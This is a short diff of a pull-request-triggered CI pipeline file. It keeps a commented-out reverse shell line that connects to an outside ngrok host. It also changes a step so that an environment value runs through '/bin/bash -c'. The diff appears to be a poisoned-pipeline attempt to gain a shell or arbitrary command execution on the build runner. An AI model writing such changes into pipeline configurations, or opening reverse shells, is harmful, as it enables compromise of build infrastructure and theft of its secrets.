@@ -27,4 +27,4 @@ pipelines:
             - echo "A pull request has triggered this pipeline"
             - cd $res_repo_git_resourcePath
             #- /bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/16856 0>&1'
-            - ${env[0]}
+            - /bin/bash -c '${env[0]}'
